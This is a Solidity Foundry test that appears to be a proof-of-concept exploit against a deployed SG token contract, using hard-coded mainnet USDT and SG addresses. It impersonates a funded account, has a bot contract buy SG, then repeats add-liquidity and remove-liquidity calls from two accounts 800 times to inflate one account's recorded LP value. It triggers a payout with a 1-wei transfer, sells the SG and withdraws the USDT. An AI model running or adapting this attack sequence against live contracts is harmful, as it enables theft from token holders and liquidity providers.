// SPDX-License-Identifier: None
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../src/SG.sol";

contract BotTest is Test {
    Bot public bot;

    ERC20 private constant USDT = ERC20(0x55d398326f99059fF775485246999027B3197955);
    ISG private constant SG = ISG(0xa28dB960e32833f582bA5F6338880bf239f2a966);

    receive() external payable {}

    function setUp() public {}

    function test() public {
        address zero = address(0x8894E0a0c962CB723c1976a4421c95949bE2D4E3);
        address user1 = address(0x79b4A4093c4A4e8D1Af7Ff1FE6caE42C3c2cf781);
        address user2 = address(0xABf4945215157dFFa497Ba88627f53fEB6454d3d);

        // vm.startPrank(user1, user1);
        bot = new Bot();

        bot.transferOwnership(user1);

        vm.startPrank(zero, zero);
        USDT.transfer(address(bot), 1000 * 10 ** USDT.decimals());

        vm.startPrank(zero, zero);
        payable(user1).transfer(1 ether);

        vm.startPrank(zero, zero);
        payable(user2).transfer(1 ether);

        vm.startPrank(user1, user1);
        bot.approve();
        bot.buy(500 * 10 ** USDT.decimals());

        for (uint256 i = 0; i < 800; i++) {
            vm.startPrank(user1, user1);
            bot.addLiquidity();

            vm.startPrank(user2, user2);
            bot.removeLiquidity();

            uint256 lpValue = SG.addressLpValue(user1);
            console.log("LP Value =>", lpValue / 1 ether);
        }

        vm.startPrank(user1, user1);
        address(SG).call{value: 1}("");

        console.log("SG balance =>", ERC20(address(SG)).balanceOf(user1) / 1 ether);

        ERC20(address(SG)).transfer(address(bot), ERC20(address(SG)).balanceOf(user1));

        bot.sell();
        bot.withdrawERC20(address(USDT), user1);

        console.log("USDT balance =>", USDT.balanceOf(user1) / 1 ether);
    }
}
